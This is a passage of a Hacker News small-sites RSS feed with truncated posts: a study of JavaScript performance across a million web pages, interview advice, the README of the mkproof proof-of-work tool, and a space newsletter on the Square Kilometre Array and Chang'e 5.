<br/>
December 23, 2020 | https://catchjs.com/Blog/PerformanceInTheWild | <a href="https://web.archive.org/web/*/https://catchjs.com/Blog/PerformanceInTheWild">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        
<ol>
    <li><a href="https://catchjs.com/Docs">Blog</a></li>
    <li>JavaScript Performance in the Wild 2020</li>
</ol>

        
        
        <p>We rendered the <a href="https://tranco-list.eu/">top 1 million pages</a> on the web, tracking every conceivable performance metric, logging every error, noting every requested URL. To our knowledge this produces the first dataset that connects performance, errors, and library use on the web. In this article we analyze what the data can tell us about creating high performance web sites.</p>
        <div>
            <p><b>1M </b> pages visited
            </p>
            <p><b>65</b> metrics per page
            </p>
            <p><b>21M</b> resource URLs requested
            </p>
            <p><b>383K</b> errors logged
            </p>
            <p><b>88M</b> global variables logged
            </p>
        </div>
        
        <p>Can you do better than our analysis? We <a href="https://www.kaggle.com/indexhtml/web-performance-metrics">published the dataset to Kaggle</a>, so you can crunch the numbers yourself.</p>
        <h2>Why render a million web pages?</h2>
        <p>
            A common sentiment these days is that the web is somehow slower and buggier than it was 15 years ago. Because of an ever-growing pile of JavaScript and frameworks and webfonts and polyfills, we've eaten up all the gains that faster computers, networks and protocols have given us. Or so the argument goes. We wanted to check if this was actually true and try to find what common factors are causing slow and broken websites in 2020.
        </p>
        <p>
            The high level plan was simple: Scripting a web browser, having it render the root page of the top 1 million domains, and logging every conceivable metric: render times, request counts, repaints, JavaScript errors, libraries used, etc. With all this data, we can ask questions about how one factor correlates with another. What factors contribute most to slow render times? Which libraries are correlated with long time-to-interactive? What are the most common errors, and what's causing them?
        </p>
        <p>
            Gathering the data was a matter of writing a bit of code to use Puppeteer to script Chrome, firing up 200 EC2 instances, rendering a million web pages over the weekend, and praying that you've actually understood how AWS pricing works.
        </p>

        <h2>Overall numbers</h2>

        <ul>
            <li><b>Protocol use for root HTML document</b></li>
            <li><span><span></span></span>HTTP 0.9 (0.003%)</li>
            <li><span><span></span></span>HTTP 1.0 (0.22%)</li>
            <li><span><span></span></span>HTTP 1.1 (40.7%)</li>
            <li><span><span></span></span>HTTP 2 (59%)</li>
            <li><span><span></span></span>HTTP 3 (0.08%)</li>
        </ul>
        
        <p>HTTP 2 is now more common than HTTP 1.1, but HTTP 3 is still rare. (Note: We're counting anything using the QUIC protocol as HTTP 3, even if Chrome sometimes reports this as HTTP 2 + QUIC.) This was for the root document, for linked resources the protocol numbers look a bit different.</p>

        <ul>
            <li><b>Protocol use for linked resources</b></li>
            <li><span><span></span></span>HTTP 0.9 (0.0001%)</li>
            <li><span><span></span></span>HTTP 1.0 (0.015%)</li>
            <li><span><span></span></span>HTTP 1.1 (28.8%)</li>
            <li><span><span></span></span>HTTP 2 (62.5%)</li>
            <li><span><span></span></span>HTTP 3 (8.6%)</li>
        </ul>

        <p>For linked resources, HTTP 3 is about 100x more prevalent. How can this be true? Because all the sites are linking the same stuff:</p>
        
        <ul>
            <li><b>Top linked URLs</b></li>
            <li><span><span></span></span> <span>https://www.google-analytics.com/analytics.js</span> (34.8%) </li>
            <li><span><span></span></span> <span>https://connect.facebook.net/en_US/fbevents.js</span> (12.6%) </li>
            <li><span><span></span></span> <span>https://www.googletagservices.com/activeview/js/current/osd.js?cb=%2Fr20100101</span> (7.0%) </li>
            <li><span><span></span></span> <span>https://www.googleadservices.com/pagead/conversion_async.js</span> (6.5%) </li>
            <li><span><span></span></span> <span>https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js</span> (5.8%) </li>
            <li><span><span></span></span> <span>https://pagead2.googlesyndication.com/pagead/js/r20200831/r20190131/show_ads_impl_fy2019.js</span> (5.7%) </li>
            <li><span><span></span></span> <span>https://www.gstatic.com/recaptcha/releases/NjbyeWjjFy97MXGZ40KrXu3v/recaptcha__en.js</span> (4.6%) </li>
            <li><span><span></span></span> <span>https://ssl.google-analytics.com/ga.js</span> (3.9%) </li>
            <li><span><span></span></span> <span>https://script.hotjar.com/modules.bea1968def3c3b64afc1.js</span> (3.5%) </li>
            <li><span><span></span></span> <span>https://platform.twitter.com/widgets.js</span> (3.0%) </li>
            <li><span><span></span></span> <span>https://www.google-analytics.com/plugins/ua/ec.js</span> (2.3%) </li>
            <li><span><span></span></span> <span>https://www.google-analytics.com/plugins/ua/linkid.js</span> (2.3%) </li>
            <li><span><span></span></span> <span>https://snap.licdn.com/li.lms-analytics/insight.min.js</span> (2.3%) </li>
            <li><span><span></span></span> <span>https://bat.bing.com/bat.js</span> (2.2%) </li>
            <li><span><span></span></span> <span>https://s.ytimg.com/yts/jsbin/www-widgetapi-vflPPZq4_/www-widgetapi.js</span> (2.2%) </li>
        </ul>

        <p>There's a handful of scripts that are linked on a large portion of web sites. This means we can expect these resources to be in cache, right? Not any more: Since Chrome 86, <a href="https://developers.google.com/web/updates/2020/10/http-cache-partitioning">resources requested from different domains will not share a cache</a>. Firefox is planning to implement the same. Safari has been splitting its cache like this for years.</p>

        <h2>What makes the web slow: Predicting time-to-interactive</h2>

        <p>
            Given this dataset of web pages and their load time metrics, it would be nice to learn something about what it is that makes web pages slow. We'll investigate the dominteractive metric, which is the time it takes before the document becomes interactive to the user. The simplest thing we could do is just to look at the correlation of each metric with dominteractive.
        </p>

        <p>
            <img src="https://catchjs.com/images/blog/errs-and-perf/dominteractive-correlation.png" alt="Correlations with dominteractive">
            </p><blockquote>Correlations of metrics with dominteractive</blockquote>
        
        <p>
            Essentially every metric is positively correlated with dominteractive, except the 0-1 variable indicating HTTP2 or greater. Many of these metrics are also positively correlated with each other. We need a more sophisticated approach to get at individual factors contributing to a high time-to-interactive.
        </p>

        <p>Some of the metrics are timings, measured in milliseconds. We can look at their box-plot to get an idea of where browsers are spending their time.</p>
        <div>
            <p><img src="https://catchjs.com/images/blog/errs-and-perf/timings-box-plot.png" alt="Box plot of web page timings"></p><blockquote>Box-plot of timing metrics. The orange line is the median, the box goes from the 25th to the 75th percentile.</blockquote>
        </div>
        <p>
            One way to get at the individual factors contributing to a high time-to-interactive is to do a linear regression, where we predict dominteractive from other metrics. That means we assign a weight to each metric and model the dominteractive time of a page as the weighted sum of the other metrics, plus some constant. An optimization algorithm sets the weights so as to minimize the prediction error over the whole dataset. The size of the weights found by the regression tells us something about how much each metric contributes to the slowness of the page.
        </p>
        <p>
            We'll exclude timing metrics from the regression. If we spend 500ms establishing a connection, that adds 500ms to dominteractive, but this is not a particularly interesting insight. Timing metrics are fundamentally <em>outcomes</em>. We want to learn what causes them.
        </p>

        
        <p id="full-di-expand"><a onclick="expandDi()">View regression code <span></span></a></p>
        
        <ul>
            <li><b>Regression coefficients for metrics, predicting dominteractive</b></li>
            <li><span><span></span></span><span><span></span></span>main_doc_is_http2_or_greater (-477.53)</li>
            <li><span><span></span></span><span><span></span></span>jsheapusedsize_Kb (-0.02)</li>
            <li><span><span></span></span><span><span></span></span>jseventlisteners (0.01)</li>
            <li><span><span></span></span><span><span></span></span>node_count (0.03)</li>
            <li><span><span></span></span><span><span></span></span>total_transfersize_Kb (0.04)</li>
            <li><span><span></span></span><span><span></span></span>recalcstyle_count (1.05)</li>
            <li><span><span></span></span><span><span></span></span>layout_count (1.13)</li>
            <li><span><span></span></span><span><span></span></span>numberofrequests (15.68)</li>
            <li><span><span></span></span><span><span></span></span>redirect_count (354.27)</li>
        </ul>
        <p>
            The numbers in parenthesis are the regression coefficients learned by the optimization algorithm. You can interpret these as having units of milliseconds. While the exact numbers should be taken with a grain of salt (see note below), it is interesting to see the scale assigned to each feature. For example, the model predicts a 354ms slow down for every redirect needed to deliver the main document. Whenever the main HTML document is delivered via HTTP2 or higher, the model predicts a 477ms lower time-to-interactive. For each request triggered by the document, it predicts an additional 16 ms. 
        </p>

        <p>
            When interpreting regression coefficients, we need to keep in mind that we're operating on a simplified model of reality. Time-to-interactive is not in fact determined by a weighted sum of these input metrics. There are clearly causal factors the model has no chance of discovering. Confounding variables is clearly an issue. As an example, if loading the main document with HTTP2 is correlated with loading <i>other</i> requests over HTTP2, then the model will bake this advantage into the weights for main_doc_is_http2_or_greater, even if the speed up comes from requests other than the main document. We need to be cautious when mapping what the model says onto conclusions about reality.
        </p>

        <h3>What is the effect of HTTP protocol version on dominteractive?</h3>
        <p>Here's a fun plot of dominteractive split by the HTTP protocol version used to deliver the root HTML page.</p>
        <div>
            <p><img src="https://catchjs.com/images/blog/errs-and-perf/dominteractive-by-protocol.png" alt="Box-plot of dominteractive split by HTTP protocol version"></p><blockquote>Box-plot of dominteractive split by HTTP protocol version of the first request. The orange line is the median, the box goes from the 25th to the 75th percentile. The percentages in parenthesis are the fraction of requests made with this protocol.</blockquote>
        </div>

        <p>There's a tiny number of sites still delivered over HTTP 0.9 and 1.0. And these sites happen to be fast. It seems we can't disentangle the fact that protocols have gotten faster with the effect that programmers will happily consume this speed-up by delivering more stuff to the browser.</p>

        <p>This is for the protocol version used to deliver the root HTML page. What if we look at the effect of the protocol for resources linked in that document? If we do a regression on number of requests by protocol version, we get the following.</p>

        
        <p id="full-rs-expand"><a onclick="expandRs()">View regression code <span></span></a></p>
        
        <ul>
            <li><b>Regression coefficients for number of requests by protocol version, predicting dominteractive</b></li>
            <li><span><span></span></span><span><span></span></span>http2_requests (14.18)</li>
            <li><span><span></span></span><span><span></span></span>http3_requests (22.05)</li>
            <li><span><span></span></span><span><span></span></span>http1_1_requests (25.14)</li>
            <li><span><span></span></span><span><span></span></span>http1_0_requests (61.18)</li>
        </ul>
        <p>If we were to believe this, we would conclude that moving requested resources from HTTP 1.1 to 2 gives a 1.8x speed-up, while going from HTTP 2 to 3 causes 0.6x slow down. Is it really true that HTTP 3 is a slower protocol? No: A more likely explanation is that HTTP 3 is rare, and that the few resources that are being sent over HTTP 3 (e.g. Google Analytics) are things that have a larger than average effect on dominteractive.</p>

        <h3>What is the effect of type of content on dominteractive?</h3>
        <p>Let's predict time-to-interactive from the number of bytes transferred, split by the type of data being transferred.</p>

        
        <p id="full-ts-expand"><a onclick="expandTs()">View regression code <span></span></a></p>
        

        <ul>
            <li><b>Regression coefficients for kilobytes transferred by request initiator, predicting dominteractive</b></li>
            <li><span><span></span></span><span><span></span></span>fetch_initia…</li></ul></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://catchjs.com/Blog/PerformanceInTheWild">https://catchjs.com/Blog/PerformanceInTheWild</a></em></p>]]>
            </description>
            <link>https://catchjs.com/Blog/PerformanceInTheWild</link>
            <guid isPermaLink="false">hacker-news-small-sites-25519928</guid>
            <pubDate>Wed, 23 Dec 2020 17:33:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interview advice that got me offers]]>
            </title>
            <description>
<![CDATA[
Score 495 | Comments 287 (<a href="https://news.ycombinator.com/item?id=25519718">thread link</a>) | @ZainRiz
<br/>
December 23, 2020 | https://www.zainrizvi.io/blog/the-interviewing-advice-no-one-shares/ | <a href="https://web.archive.org/web/*/https://www.zainrizvi.io/blog/the-interviewing-advice-no-one-shares/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->


				<div>
					<p>“What would you say if I asked you to design me a service capable of responding to thousands of user requests every second and latency was critical?”</p><p>“Umm...that you have to solve this problem at work. But you’re out of ideas, and are looking to interviewees for suggestions”</p><p>That’s the actual response I gave the interviewer the first time I was asked a design question. He had a good laugh. But then still made me design the service.</p><p>In the decade since I’ve lost track of how many hours I’ve spent in the interview room, on both sides of the table. I’ve worked at Microsoft, Google, and Stripe, and received offers from many other companies. As I interviewed, I realized one thing: standard interviewing advice falls woefully short.</p><p>What good does it do to practice coding problems for weeks if your mind goes blank in an interview room? Everyone says to be wary of the recruiters, but what if you weren’t? How can you show your “best self” if you’re too afraid to let it out?</p><p>I tested the answers to these questions multiple times (sometimes by accident). Turns out conventional wisdom gets you conventional results. But you can do better. Interviewing is a skill and anyone can learn it.</p><p>For some reason no one talks about these aspects of interviewing, but I’ve found them helpful time and time again.</p><p>We’ll cover:</p><ul><li>Using recruiters to your advantage</li><li>Going to real interviews for practice</li><li>Being open to learning during interviews</li><li>Keeping those skills sharp even when you’re not job hunting</li></ul><h2 id="tip-1-use-recruiters-to-your-advantage">Tip #1: Use recruiters to your advantage</h2><p>Their voice sounds so friendly and helpful when you chat with them on the phone. “Zain, I’m looking forward to seeing you when you come for your interview!” Clearly it’s all an act, past-me assumed. I was sure they were secretly judging me, deciding if I was good enough to work at the company.</p><p>And they do judge. But not in the way I was expecting.</p><p>Recruiters aren’t evaluating you technically, not by the time you pick up the phone anyways. Their decision on whether you have the technical chops to be worth interviewing was made well before that call. If you’re being offered an interview: Congratulations, you've already passed that bar</p><p>Now the recruiter wants to work <em>with</em> you. Their whole job is to, you know, recruit. They know that you statistically have poor interview prep skills, and are happy to help fix that flaw. Why discard strong candidates who can’t interview well? They’ll level the playing field by helping everyone show their best selves when interviewing.</p><p><strong>How can you take advantage of this?</strong></p><p>Ask them questions! Things like:</p><ul><li>“What should I do to prepare for the interview?”</li><li>“What are the company values that would be good to highlight during the interview?”</li></ul><p>And be forthright about any problems you run into:</p><ul><li>If you get sick the day before the interview, call up the recruiter and ask to reschedule. They want to test you when you're at your best!</li><li>Work pressures left you with no time to prepare? You can still try rescheduling. At worst they'll say "sorry, we can't do that". It will not hurt your chances of getting in</li></ul><p>Your mad technical skills no longer matter to them. If anything, humility and an openness to learning will show you in the best light.</p><h2 id="tip-2-go-to-real-interviews-for-practice">Tip #2: Go to real interviews for practice</h2><p>You need to build up your interviewing skills. LeetCode is great, but it doesn’t come close to the real thing. Try to interview at actual companies as much as possible. And don't limit yourself to the companies you care about.</p><p><strong>Learn to deal with pressure</strong></p><p>When you're in a real interview the world changes: You're locked in a cage with a lion. Every heartbeat is a gorilla bashing against the walls. Your mental gears gunk up as your body goes into fight or flight mode. Your clammy hands struggle to write half legible code on the white board. A threat hides behind every shadow. Even an innocuous "Would you like something to drink?" is a nefarious test: do I pick coke or coffee?</p><p>You only get that experience in a real interview. And only real interviews teach you how to deal with it. The first interview will kick your ass. So will the second. But once you get a few under your belt you'll get used to the adrenaline rush. Perhaps enjoy it even. You'll become a bullfighter, confidently facing down the charging bull. That’s how you get over the fear.</p><p>You may even find that these practice interviews are much easier! When the stakes are low that lion doesn't look so fierce. I've found that I perform the best in the interviews where I don't care about the outcome. I'm much more relaxed and at ease. I can think faster, my brain reaches out to more possibilities. Now, even in important interviews I try to convince myself that I don't really care. That mindset shift is only possible because I got to experience it in the low stakes games first.</p><p><strong>Learn to answer the more ambiguous questions</strong></p><p>And what about the questions? After each interview write down all the questions you were asked. The same evening look over the questions while they’re still fresh in your mind. Focus especially on the behavioral and design ones which have no clear right answer. Consider how you could have responded better. Are there stories from your life you could have referenced? Wait a few days and look at them again. You’ll find better answers.</p><p>Each answer you prepare this way becomes a blob of paint on your pallet. Chances are high that you'll come across similar questions in future interviews. Over time you'll be able to mix the answers from your pallet to paint a picture highlighting how your abilities make you a valuable asset to the company.</p><p><strong>Stay open to serendipity</strong></p><p>As you do these interviews, you may discover that the “practice” company is actually interesting after all. Recruiters count on that. I’ve had recruiters suggest I interview even when I told them I didn’t find the company interesting. “Maybe you’ll change your mind after seeing us up close”, they suggest.</p><p>And I did. More than once.</p><h2 id="tip-3-be-open-to-learning-during-the-interview">Tip #3: Be open to learning during the interview</h2><p>I learned this one by accident, but boy does it pay off.</p><p>In a college career fair once I was walking through the booths with my bag full of swag. My eyes caught a pile of rubik’s cubes being given away by some company I'd never heard of. I wanted one! Of course I couldn't just go up and ask for it directly, so I went and chatted with the guy manning the booth. His name was Vince. A few minutes later I walked away with my prized rubik's cube in hand. That evening I got a call from Vince offering to conduct a full interview loop on campus. I already had a job offer from a company I liked, but I thought "Sure, why not? I could use the experience"</p><p>I had no intention of joining the company, they were some boring finance business. There was nothing to lose. So during the interview I felt free to ask any question I wanted. When I thought I got the answer to an interview question wrong, I'd ask "I don't think I did so great here. What's the right answer to this problem?" (I wanted to learn the answer for future interviews!). When I was asked a challenging question I could grin and delight in the problem solving aspect instead of worrying about how badly it would reflect on me. (Remember my smart aleck remark in the intro? That was this interview.)</p><p>Turns out they liked that: the next day I had a second job offer. At a significantly higher salary than my first one. Oh, and they wanted to fly me to New York in two weeks for an introduction to the company. I still didn’t want to join, but a free trip to New York? Sign me up! The company's name: Bloomberg</p><p>Bloomberg was a practiced hand at recruiting. They had a full two days of events to leave us starry eyed about the company (I came thiiiiis close to accepting their offer). While there, Vince told me I’d made a great impression by fearlessly asking questions, even when I was stumped.</p><p>Since then I’ve stopped hesitating before asking any question in an interview. Let your curiosity run free! Don’t cage it! And as an interviewer, I can attest: sincere interest is always a good sign.</p><h2 id="tip-4-keep-your-skills-sharp-even-when-you-re-not-job-hunting">Tip #4: Keep your skills sharp even when you’re not job hunting</h2><p><a href="https://twitter.com/docjamesw">James Whittaker</a> recommends trying to get a job offer every year, just to make sure you can.</p><p>It's an extremely liberating feeling knowing that even if you lose your job you'll be able to find another one quickly. That's a huge stress off your back.</p><p>I haven't been very good about this myself, but every once in a while I'll accept an invitation from a recruiter (it helps to set up your LinkedIn account). I don't bother doing any prep for these interviews, at least not initially. Those interviews show me the areas I need to brush up on or where the industry practices are changing.</p><p>For example, in a tech screen I did last summer there was some miscommunication and I didn’t realize they expected actual working code. Instead of the usual pseudocode written in a google doc, the interviewer told me to select my language of choice on an online IDE. Now, I don't have a particular language I consider myself super proficient in. I touch many different tools at work and end up having to use a different language about every 5 months. So even basic things like "create an array" tends to require googling the syntax. Given that, what's my favorite language of choice? C#, hands down. So I selected that.</p><p>What hadn't occurred to me at the time is that C# is a very verbose language which Visual Studio beautifully automates away the tedious parts of. This online IDE automated nothing. Even for a basic task like creating an array I had to spend precious interview minutes looking up the right package to import and the exact syntax to use. Needless to say, I ran out of time. I crashed and burned there, but it opened my eyes to the way interviews are changing and how I needed to prepare in the future.</p><p>Four months later a company called Stripe reached out to me. They also expect you to write working code and even let you use your own IDE. This time I was ready. And now I work there. (Psst, <a href="https://stripe.com/jobs/search">we're hiring</a>…</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.zainrizvi.io/blog/the-interviewing-advice-no-one-shares/">https://www.zainrizvi.io/blog/the-interviewing-advice-no-one-shares/</a></em></p>]]>
            </description>
            <link>https://www.zainrizvi.io/blog/the-interviewing-advice-no-one-shares/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25519718</guid>
            <pubDate>Wed, 23 Dec 2020 17:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is there a simple text editor for Android?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25519616">thread link</a>) | @todsacerdoti
<br/>
December 23, 2020 | https://www.gibney.de/a_simple_text_editor_for_android | <a href="https://web.archive.org/web/*/https://www.gibney.de/a_simple_text_editor_for_android">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.gibney.de/a_simple_text_editor_for_android</link>
            <guid isPermaLink="false">hacker-news-small-sites-25519616</guid>
            <pubDate>Wed, 23 Dec 2020 17:04:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mkproof – A simple tool for generating and verifying proofs of work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25519407">thread link</a>) | @simonpure
<br/>
December 23, 2020 | https://git.sr.ht/~sircmpwn/mkproof | <a href="https://web.archive.org/web/*/https://git.sr.ht/~sircmpwn/mkproof">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="readme">
    <div>
      <pre>				    mkproof

mkproof is a small C program for generating proofs of work.

				  Installation

If mkproof is available as a package on your system, prefer to install that
rather than build it yourself.

mkproof depends only on a POSIX-like environment and a C99 compiler.

	$ ./configure
	$ make

This will produce three executables: mkchallenge, mkproof, and checkproof.

				     Usage

The situation: Bob wants Alice to do something, but Alice isn't sure if Bob is a
robot.

1. Alice runs `mkchallenge` and sends the challenge to Bob.
2. Bob runs `mkproof &lt;challenge&gt;` and wastes some CPU time. After several
   minutes of work, a proof is printed to stdout.
3. Bob sends the proof to Alice.
4. Alice runs `checkproof &lt;challenge&gt; &lt;proof&gt;` to verify the work.

Now Alice can be reasonably confident that Bob is not a robot, and proceed with
Bob's request.

				   Algorithm

To make a challenge, generate 16 random bytes. Choose the argon2 iterations and
memory parameters, and the number of zeroed digits, to tune the difficulty. The
challenge string is the terms "argon2id"; the iterations, memory use, and number
of digits which shall be zero, as decimal integers; and the random bytes as
hexadecimal; joining the terms with ":".

To make a proof, split the challenge by ":" and verify that the first token is
"argon2id". Decode the iterations, memory, and digits parameters, and the
challenge bytes.

Repeat the following algorithm to generate proofs until an argon2id key
is found whose first N bits are zero, where N is equal to the digits
parameter:

1. Generate 16 random bytes (password).
2. Run argon2id with the generated password, and the memory and iteration
   parameters provided by the challenge, and the challenge bytes as the salt.
   The hash length and parallelism parameters shall be respectively set to 32
   and 1.
3. Encode the argon2id hash as hexadecimal.

When a suitable hash is found, encode the password in hexadecimal. This is the
proof which should be transmitted to the challenger.

To verify the proof, simply run the proof algorithm with the original challenge
parameters and the challengee's provided password and verify that the resulting
hexadecimal string is prefixed with the appropriate number of zeroes.

				     Notes

The defaults are tuned to take about five minutes on one core of a modern
consumer CPU.
</pre>
    </div>
  </div></div>]]>
            </description>
            <link>https://git.sr.ht/~sircmpwn/mkproof</link>
            <guid isPermaLink="false">hacker-news-small-sites-25519407</guid>
            <pubDate>Wed, 23 Dec 2020 16:41:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Square Kilometer Array]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25519366">thread link</a>) | @tectonic
<br/>
December 23, 2020 | http://orbitalindex.com/archive/2020-12-23-Issue-96/#the-square-kilometer-array | <a href="https://web.archive.org/web/*/http://orbitalindex.com/archive/2020-12-23-Issue-96/#the-square-kilometer-array">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="_main" role="main" data-color="#4fb1ba" data-theme-color="black" data-image="/assets/img/sidebar-bg.jpg" data-overlay=""><article class="page" role="article"><header></header><div id="mc-archive"> <center> <!--[if (gte mso 9)|(IE)]><table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;"><tr><td align="center" valign="top" width="600" style="width:600px;"> <![endif]--><table><tbody><tr><td id="templatePreheader"><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><em>Happy Holidays from The Orbital Index! We hope that you are enjoying distanced celebrations with your friends and families, watching the once-in-800-year planetary conjunction, and are looking forward to it being a year that isn’t 2020. —Andrew &amp; Ben</em></p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div></td></tr><tr><td id="templateHeader"><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><div><p>Issue No. 96 |&nbsp;Dec 23, 2020</p><p>   <span>🚀 🎁 🛰</span></p></div></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div></td></tr><tr><td id="templateBody"><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><div><p>Machine learning isn’t <a href="http://orbitalindex.com/archive/2020-12-09-Issue-94/#machine-learning-in-space" target="_blank">just for space</a>. It’s also for space newsletters. For your enjoyment, we fine-tuned the GPT-2 machine learning language model on our archives and <a href="http://orbitalindex.com/feature/gpt2" target="_blank">you won’t believe what happened next</a>! Our favorite output: <em>Geese are probably not extraterrestrial in origin (paper). </em>But, check out the <a href="http://orbitalindex.com/feature/gpt2/" target="_blank">rest of the space news</a> from an alternate reality as well!&nbsp;</p><p>  ☙✶❧</p></div></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#as-always-it-s-probably-not-aliens">¶</a><strong id="as-always-it-s-probably-not-aliens">As always, it's probably not aliens.</strong> Back in 2019, <a href="https://breakthroughinitiatives.org/initiative/1" target="_blank">Breakthrough Listen</a> detected a very narrow, unmodulated, <a href="https://www.scientificamerican.com/article/alien-hunters-discover-mysterious-signal-from-proxima-centauri/#:~:text=And%20second,%20the%20signal%20%E2%80%9Cdrifts" target="_blank">drifting</a>, transient radio emission at 982.002 MHz from the direction of <a href="https://en.wikipedia.org/wiki/Proxima_Centauri" target="_blank">Proxima Centauri</a>, a member of the Alpha Centauri star system and our closest stellar neighbor at only 4.2 light-years away. Proxima Centauri is a red dwarf star (when you hear this, you should think: <a href="https://iopscience.iop.org/article/10.3847/2041-8213/aacaf3" target="_blank">powerful planet-sterilizing solar flares</a>) with at least two planets, <a href="https://en.wikipedia.org/wiki/Proxima_Centauri_b" target="_blank">one of which is in its “habitable” zone</a>. Dubbed <a href="https://en.wikipedia.org/wiki/BLC1" target="_blank">BLC-1</a>, this is the first candidate signal in the Breakthrough Listen project that has gotten through both their layers of automated filters designed to throw out noise / human-made emissions and then manual inspection. They are currently writing analysis papers and repeatedly stressing that, since we don’t know of a mechanism in nature that creates such a narrow band emission, this signal is almost certainly terrestrial interference of an unexpected type. While almost certainly not aliens, this signal presents an opportunity to tune our SETI filters, learn about <a href="https://news.ycombinator.com/item?id=25477713" target="_blank">novel sources of terrestrial interference</a>, and practice for the day when we finally receive a signal for which there is no abiotic explanation. <a href="https://www.nationalgeographic.com/science/2020/12/alien-hunters-detect-mysterious-radio-signal-from-nearby-star/" target="_blank">Nadia Drake has a good writeup</a>.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#the-square-kilometer-array">¶</a><strong id="the-square-kilometer-array">The Square Kilometer Array.</strong> The world’s most ambitious radio telescope project <a href="https://twitter.com/fcdogovuk/status/1339148967603556354?s=21" target="_blank">took a step forward last week with the UK signing a final agreement to host the headquarters of the Square Kilometer Array</a> (SKA) at the <a href="https://www.jodrellbank.net/" target="_blank">Jodrell Bank Observatory</a> outside Manchester, a <a href="https://whc.unesco.org/en/list/1594/" target="_blank">UNESCO world heritage site</a> for its work in early radio astronomy. The SKA itself, a massive <a href="https://en.wikipedia.org/wiki/Very-long-baseline_interferometry" target="_blank">long-baseline interferometer array</a>, will be built in an expansive spiral of antennas (with core installations in Australia and S. Africa—<a href="https://youtu.be/8BBoDw2qVD0" target="_blank">video</a>) designed to maximize the <em>buildable </em>number of baseline lengths/angles for the greatest scientific flexibility (a truly random scattering of antennas would yield more length/angle combinations, but would be highly impractical to build and connect together). When complete, the <a href="https://www.skatelescope.org/the-ska-project/" target="_blank">SKA will be made up of thousands of mid-frequency dishes and up to 1 million low-frequency antennas</a> and will be the most sensitive radio telescope (by ~50x). It will operate over a wide frequency range (eventually 50 MHz to 30 GHz—<a href="https://en.wikipedia.org/wiki/Arecibo_Telescope" target="_blank">Arecibo</a> for comparison operated at 300 MHz to 10 GHz) and, using phased array antennas, SKA will be able to <a href="https://en.wikipedia.org/wiki/Square_Kilometre_Array#Description" target="_blank">host multiple users at once and survey the sky 10,000x faster than current radio telescopes</a>. SKA will re-re-re-verify general relativity, look at how early stars and black holes formed, and drastically increase our SETI abilities. Phase I of construction ends in 2023 and provides 10% of the telescope’s final power.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#chang-e-5-arrives">¶</a><strong id="chang-e-5-arrives">Chang’e 5 arrives</strong>. Chang’e 5 successfully delivered 1.7 kg of lunar samples to <a href="https://twitter.com/aj_fi/status/1339282894683074562" target="_blank">Inner Mongolia</a>, the first lunar samples since 1976 and the first ever from the young<em>ish</em> <a href="https://en.wikipedia.org/wiki/Oceanus_Procellarum" target="_blank">Oceanus Procellarum region</a>. The Chang’e 5 orbiter adjusted its trajectory after releasing the sample capsule in order to avoid slamming into the atmosphere and is now <a href="https://spacenews.com/change-5-orbiter-embarks-on-extended-mission-to-sun-earth-lagrange-point/" target="_blank">heading to the L1 Sun-Earth Lagrange point for an extended mission</a> of Sun observation and operational tests. With Chang’e 5’s success, its backup craft, Chang’e 6, is now available for a new mission in 2023, either to the Moon’s south pole, or, <a href="https://moonmonday.jatan.space/p/issue-06#:~:text=Wu%20said%20if%20the%20Queqiao%20satellite%20being%20used%20to%20relay%20Chang%E2%80%99e%204%20communications%20seems%20to%20be%20functioning%20well%20till%20then" target="_blank">if the Queqiao relay satellite is still functioning well, perhaps to the Moon’s far side</a>. Meanwhile, China continues its building cadence of ambitious missions, with an upcoming <a href="https://en.wikipedia.org/wiki/ZhengHe_(spacecraft)" target="_blank">asteroid sampling</a> mission, more <a href="https://en.wikipedia.org/wiki/Chinese_Lunar_Exploration_Program#Phase_IV:_Lunar_research_station" target="_blank">lunar exploration</a>, a Mars sample return 